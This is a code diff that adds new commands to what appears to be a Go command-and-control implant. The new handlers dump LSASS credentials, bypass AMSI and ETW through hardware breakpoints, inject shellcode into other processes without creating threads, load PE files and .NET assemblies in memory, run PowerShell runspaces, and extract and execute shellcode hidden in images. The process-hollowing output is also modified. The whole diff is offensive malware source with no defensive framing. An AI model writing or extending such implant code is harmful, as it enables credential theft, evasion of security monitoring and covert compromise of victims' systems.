@@ -148,6 +148,34 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handleSOCKS5Stop(result)
 	case "socks5_status":
 		handleSOCKS5Status(result)
+
+	// ── New techniques ─────────────────────────────────────────────────────
+	// LSASS alternative dump methods
+	case "lsass_dump_dup":
+		handleLSASSDumpDup(cmd, result)
+	case "lsass_dump_wer":
+		handleLSASSDumpWER(cmd, result)
+	// Patchless AMSI/ETW via HWBP
+	case "amsi_hwbp":
+		handleAMSIHWBP(result)
+	case "etw_hwbp":
+		handleETWHWBP(result)
+	// Threadless injection
+	case "threadless_inject":
+		handleThreadlessInject(cmd, result)
+	// In-memory PE loader
+	case "pe_load":
+		handlePELoad(cmd, result)
+	// .NET CLR hosting
+	case "dotnet_exec":
+		handleDotnetExec(cmd, result)
+	// PowerShell runspace
+	case "ps_runspace":
+		handlePSRunspace(cmd, result)
+	// Steganography shellcode loader
+	case "stego_extract":
+		handleStegoExtract(cmd, result)
+
 	case "execute":
 		fallthrough
 	default:
@@ -674,12 +702,16 @@ func handleHollow(cmd *types.Command, result *types.CommandResult) {
 		result.ExitCode = 1
 		return
 	}
-	if err := hollowShellcode(exe, sc); err != nil {
+	if err := HollowProcess(exe, sc); err != nil {
 		result.Error = err.Error()
 		result.ExitCode = 1
 		return
 	}
-	result.Output = fmt.Sprintf("[+] Hollowed %s and redirected execution (%d bytes)", exe, len(sc))
+	technique := "shellcode RIP-redirect"
+	if len(sc) >= 2 && sc[0] == 0x4D && sc[1] == 0x5A {
+		technique = "PE hollow (NtUnmapViewOfSection)"
+	}
+	result.Output = fmt.Sprintf("[+] %s → %s (%d bytes)", technique, exe, len(sc))
 }
 
 func handleHijack(cmd *types.Command, result *types.CommandResult) {
@@ -1077,6 +1109,185 @@ func handleSOCKS5Stop(result *types.CommandResult) {
 
 func handleSOCKS5Status(result *types.CommandResult) {
 	result.Output = "[socks5] " + SOCKS5Status()
+}
+
+// ── New technique handlers ────────────────────────────────────────────────────
+
+func handleLSASSDumpDup(cmd *types.Command, result *types.CommandResult) {
+	out := cmd.DestinationPath
+	if out == "" {
+		out = os.TempDir() + string(os.PathSeparator) + "lsass_dup.dmp"
+	}
+	msg, err := lsassDumpViaDup(out)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = "[+] " + msg
+}
+
+func handleLSASSDumpWER(cmd *types.Command, result *types.CommandResult) {
+	out := cmd.DestinationPath
+	if out == "" {
+		out = os.TempDir() + string(os.PathSeparator) + "lsass_wer.dmp"
+	}
+	msg, err := lsassDumpViaWER(out)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = "[+] " + msg
+}
+
+func handleAMSIHWBP(result *types.CommandResult) {
+	if err := bypassAMSIHWBP(); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = "[+] Patchless AMSI bypass active (HWBP on AmsiScanBuffer)"
+}
+
+func handleETWHWBP(result *types.CommandResult) {
+	if err := bypassETWHWBP(); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = "[+] Patchless ETW bypass active (HWBP on EtwEventWrite)"
+}
+
+func handleThreadlessInject(cmd *types.Command, result *types.CommandResult) {
+	if cmd.InjectPID == 0 {
+		result.Error = "inject_pid required"
+		result.ExitCode = 1
+		return
+	}
+	if cmd.ShellcodeB64 == "" {
+		result.Error = "shellcode_b64 required"
+		result.ExitCode = 1
+		return
+	}
+	shellcode, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = "shellcode_b64 decode: " + err.Error()
+		result.ExitCode = 1
+		return
+	}
+	dllName := cmd.SacrificialDLL   // reuse: DLL containing the export to hook
+	exportName := cmd.InjectMethod  // reuse: export function name
+	if dllName == "" {
+		dllName = "ntdll.dll"
+	}
+	if exportName == "" {
+		exportName = "NtFlushInstructionCache"
+	}
+	if err := threadlessInject(cmd.InjectPID, dllName, exportName, shellcode); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Threadless hook placed on %s!%s in PID %d — waiting for caller",
+		dllName, exportName, cmd.InjectPID)
+}
+
+func handlePELoad(cmd *types.Command, result *types.CommandResult) {
+	if cmd.ShellcodeB64 == "" && len(cmd.FileContent) == 0 {
+		result.Error = "shellcode_b64 (base64 PE bytes) or file_content required"
+		result.ExitCode = 1
+		return
+	}
+	var peBytes []byte
+	var err error
+	if len(cmd.FileContent) > 0 {
+		peBytes = cmd.FileContent
+	} else {
+		peBytes, err = base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
+		if err != nil {
+			result.Error = "pe decode: " + err.Error()
+			result.ExitCode = 1
+			return
+		}
+	}
+	base, err := peLoad(peBytes)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] PE loaded at 0x%X", base)
+}
+
+func handleDotnetExec(cmd *types.Command, result *types.CommandResult) {
+	// Fields: SourcePath=assemblyPath, TokenUser=typeName, TokenArgs=methodName, TokenPass=argument
+	asmPath := cmd.SourcePath
+	if asmPath == "" {
+		result.Error = "source_path (assembly .dll path) required"
+		result.ExitCode = 1
+		return
+	}
+	typeName := cmd.TokenUser
+	if typeName == "" {
+		result.Error = "token_user (type name) required"
+		result.ExitCode = 1
+		return
+	}
+	methodName := cmd.TokenArgs
+	if methodName == "" {
+		result.Error = "token_args (method name) required"
+		result.ExitCode = 1
+		return
+	}
+	argument := cmd.TokenPass
+	retCode, err := dotnetExecute(asmPath, typeName, methodName, argument)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] .NET %s.%s() returned %d", typeName, methodName, retCode)
+}
+
+func handlePSRunspace(cmd *types.Command, result *types.CommandResult) {
+	script := cmd.Command
+	if script == "" && len(cmd.Args) > 0 {
+		script = strings.Join(cmd.Args, " ")
+	}
+	if script == "" {
+		result.Error = "command (PowerShell script) required"
+		result.ExitCode = 1
+		return
+	}
+	bridgePath := cmd.SourcePath // optional: path to psbridge.dll
+	out, err := psRunspace(script, bridgePath)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = out
+}
+
+func handleStegoExtract(cmd *types.Command, result *types.CommandResult) {
+	imgPath := cmd.SourcePath
+	if imgPath == "" {
+		result.Error = "source_path (image file) required"
+		result.ExitCode = 1
+		return
+	}
+	var key byte
+	if cmd.InjectMethod != "" {
+		n, _ := strconv.ParseUint(cmd.InjectMethod, 0, 8)
+		key = byte(n)
+	}
+	if err := stegoExtractAndRun(imgPath, key); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Shellcode extracted from %s and executed", imgPath)
 }
 
 func encryptResult(agent *Agent, result *types.CommandResult) {
